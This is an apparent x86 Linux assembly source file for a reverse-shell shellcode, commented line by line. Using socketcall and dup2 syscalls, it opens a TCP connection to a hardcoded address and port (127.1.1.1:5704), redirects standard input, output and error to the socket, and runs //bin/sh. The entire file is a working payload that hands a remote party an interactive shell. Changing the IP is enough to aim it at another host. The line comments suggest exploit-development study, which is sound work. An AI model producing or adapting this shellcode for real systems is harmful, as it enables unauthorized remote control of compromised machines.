global _start

section .text

_start:
	xor eax, eax			;; Cleanup Registers
	xor ebx, ebx			;; Cleanup Registers
	xor edx, edx			;; Cleanup Registers

	push edx				;; Push null bytes for protocol and args array terminator
	push BYTE 0x1			;; Push 1 for SOCKET_STREAM
	push BYTE 0x2			;; Push 2 for AF_INET
	mov al, 0x66			;; Syscall # for socketcall
	mov bl, 0x1				;; Socketcall call # for SYS_SOCKET
	mov ecx, esp			;; Store ptr to args array
	int 0x80				;; Syscall interrupt, as in socket(AF_INET, SOCK_STREAM, 0)
	mov esi, eax			;; Store socket_fd in esi

	push edx				;; Push null bytes to terminate args array
	push 0x0101017f			;; Push IP address of remote host in binary
	push WORD 0x4816		;; Push port number, in network byte order, as in 5704 (0x1648) becomes 0x4816
	push WORD 0x2			;; Push 2 for AF_INET
	mov ecx, esp			;; Store ptr to sockaddr struct

	push 0x10				;; Push sizeof sockaddr struct
	push ecx				;; Push ptr to sockaddr struct
	push esi				;; Push socket_fd
	mov al, 0x66			;; Syscall # for socketcall
	mov bl, 0x3				;; Socketcall call # for SYS_CONNECT
	mov ecx, esp			;; Store ptr to args array
	int 0x80				;; Syscall interrupt, as in connect(socket_fd, (*)&sockaddr, sizeof(sockaddr))

	xor ecx, ecx			;; Clear ecx
	mov cl, 0x3				;; Store loop counter for DUP2 calls
	mov ebx, esi			;; Store socket_fd for use 
DUP2s:
	mov al, 0x3f			;; Syscall # for dup2
	dec ecx					;; Decrement counter value representing new_fd
	int 0x80				;; Syscall interrupt, as in dup2(socket_fd, [2, 1, 0])
	jnz DUP2s				;; Looping with ecx as 2, 1, and 0


	push edx				;; Push null bytes for envp
	mov edx, esp			;; Store ptr to envp
	mov ecx, esp			;; Store ptr to argv
	push 0x68732f6e			;; Push bytes for //bin/sh (hs/n)
	push 0x69622f2f			;; Push bytes for //bin/sh (ib//)
	mov ebx, esp			;; Store ptr to filename
	xor eax, eax			;; Clear eax
	mov al, 0xb				;; Syscall # for execve
	int 0x80				;; Syscall interrupt, as in execve("//bin/sh", NULL, NULL)
